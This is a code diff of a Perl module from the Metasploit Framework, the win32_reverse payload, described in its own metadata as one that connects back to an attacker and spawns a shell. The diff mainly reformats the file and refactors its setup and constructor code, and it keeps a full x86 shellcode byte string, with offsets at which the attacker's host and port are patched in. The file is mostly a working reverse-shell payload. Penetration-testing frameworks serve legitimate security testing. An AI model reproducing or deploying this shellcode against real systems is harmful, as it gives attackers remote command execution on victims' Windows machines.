@@ -1,31 +1,26 @@
 package Msf::Payload::win32_reverse;
 use strict;
 use base 'Msf::PayloadComponent::Win32Payload';
-sub setup {
+sub load {
   Msf::PayloadComponent::Win32Payload->import('Msf::PayloadComponent::ReverseConnection');
 }
 
 my $info =
 {
-    'Name'         => 'winreverse',
-    'Version'      => '2.0',
-    'Description'  => 'Connect back to attacker and spawn a shell',
-    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
-    'Arch'         => [ 'x86' ],
-    'Priv'         => 0,
-    'OS'           => [ 'win32' ],
-    'Multistage'   => 0,
-    'Size'         => '',
-    'UserOpts'     =>
-        {
-            'LHOST'         =>  [1, 'ADDR', 'Local address to receive connection'],
-            'LPORT'         =>  [1, 'PORT', 'Local port to receive connection'],
-        },
-    # win32 specific code
-    'Win32Payload' =>
+  'Name'         => 'winreverse',
+  'Version'      => '2.0',
+  'Description'  => 'Connect back to attacker and spawn a shell',
+  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
+  'Arch'         => [ 'x86' ],
+  'Priv'         => 0,
+  'OS'           => [ 'win32' ],
+  'Size'         => '',
+
+  # win32 specific code
+  'Win32Payload' =>
     {
-        Offsets => { 'LPORT' => [228, 'n'], 'LHOST' => [221, 'ADDR'], 'EXITFUNC' => [344, 'V'] },
-        Payload =>
+      Offsets => { 'LPORT' => [228, 'n'], 'LHOST' => [221, 'ADDR'], 'EXITFUNC' => [344, 'V'] },
+      Payload =>
         "\xe8\x56\x00\x00\x00\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b\x45\x3c".
         "\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x32".
         "\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38\xe0\x74\x07".
@@ -48,14 +43,17 @@ my $info =
         "\x53\x51\xff\x75\x00\x68\x72\xfe\xb3\x16\xff\x55\x04\xff\xd0\x89".
         "\xe6\xff\x75\x00\x68\xad\xd9\x05\xce\xff\x55\x04\x89\xc3\x6a\xff".
         "\xff\x36\xff\xd3\xff\x75\x00\x68\x7e\xd8\xe2\x73\xff\x55\x04\x31".
-        "\xdb\x53\xff\xd0",       
-
-    }
+        "\xdb\x53\xff\xd0",
+    },
 };
 
 sub new {
-    setup();
-    my $class = shift;
-    my $self = $class->SUPER::new({'Info' => $info}, @_);
-    return($self);
+  load();
+  my $class = shift;
+  my $hash = @_ ? shift : { };
+  $hash = $class->MergeHash($hash, {'Info' => $info});
+  my $self = $class->SUPER::new($hash, @_);
+  return($self);
 }
+
+1;
